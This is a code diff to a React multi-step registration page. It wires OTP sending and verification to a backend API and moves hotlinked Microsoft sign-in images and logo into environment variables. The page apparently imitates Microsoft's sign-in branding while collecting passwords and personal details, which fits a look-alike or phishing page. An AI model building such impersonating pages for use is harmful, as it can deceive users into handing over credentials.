@@ -2,6 +2,7 @@ import { useState } from 'react';
 import { useAuth } from '../context/AuthContext';
 import { useNavigate, Link, useLocation } from 'react-router-dom';
 import { ArrowLeft } from 'lucide-react';
+import axios from 'axios';
 
 const RegisterPage = () => {
     // Steps: 1=Email, 2=Password, 3=Name, 4=Details(Country/DOB), 5=Verify(OTP)
@@ -56,9 +57,15 @@ const RegisterPage = () => {
                 setError('Please enter your birthdate.');
                 return;
             }
-            // In a real app, trigger email send here
-            console.log("Sending OTP to", email);
-            setStep(5);
+            // Trigger email send
+            axios.post(`${import.meta.env.VITE_API_URL}/auth/send-verification`, { email })
+                .then(res => {
+                    console.log("OTP sent:", res.data);
+                    setStep(5);
+                })
+                .catch(err => {
+                    setError(err.response?.data?.message || 'Failed to send verification code.');
+                });
         }
         // Step 5 is handled by handleSubmit
     };
@@ -75,16 +82,16 @@ const RegisterPage = () => {
             return;
         }
 
-        // Mock OTP check
-        // In real app: await verifyOtp(email, otp)
-
         try {
+            // Verify OTP
+            await axios.post(`${import.meta.env.VITE_API_URL}/auth/verify-code`, { email, otp });
+
             // Combine names for the simple backend 'username' field
             const fullName = `${firstName} ${lastName}`;
             await register(fullName, email, password);
             navigate('/dashboard');
         } catch (err) {
-            setError(err.response?.data?.message || 'Registration failed');
+            setError(err.response?.data?.message || 'Verification or registration failed');
         }
     };
 
@@ -97,7 +104,7 @@ const RegisterPage = () => {
             {/* Background Image */}
             <div className="absolute inset-0 z-0 hidden md:block"
                 style={{
-                    backgroundImage: "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg')",
+                    backgroundImage: `url('${import.meta.env.VITE_BG_IMAGE_URL}')`,
                     backgroundSize: 'cover',
                     backgroundPosition: 'center'
                 }}>
@@ -109,7 +116,7 @@ const RegisterPage = () => {
 
                     {/* Header Logo */}
                     <div className="mb-8 flex justify-center">
-                        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" className="h-6" />
+                        <img src={import.meta.env.VITE_LOGO_URL} alt="Microsoft" className="h-6" />
                     </div>
 
                     {/* --- STEP 1: EMAIL --- */}
